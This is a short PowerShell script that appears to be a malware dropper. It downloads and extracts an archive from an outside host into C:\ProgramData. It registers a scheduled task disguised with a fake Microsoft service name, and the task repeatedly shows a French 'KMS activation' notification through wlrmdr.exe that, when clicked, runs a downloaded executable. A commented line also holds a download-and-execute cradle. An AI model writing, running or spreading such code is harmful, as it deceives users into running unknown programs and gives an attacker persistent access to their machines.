# iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Maestran/windows-config/main/config.ps1'))

Invoke-WebRequest -Uri "https://ouest-vpn.fr/WindowsConfigManager.zip" -OutFile "C:\ProgramData\config.zip"
Expand-Archive -Path "C:\ProgramData\config.zip" -DestinationPath "C:\ProgramData\WindowsConfigManager"
$action=New-ScheduledTaskAction -Execute "wlrmdr.exe" -Argument '-s 3600 -f 0 -t Cliquez ici! -m Activation du KMS Microsoft -a 10 -u "C:\ProgramData\WindowsConfigManager\WindowsConfigManager\windows-compat.exe"'
$trigger=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) 
Register-ScheduledTask -TaskName "Systeme de comptabilite Microsoft" -Description "Assure la liste des services actifs" -Trigger $trigger -Action $action 
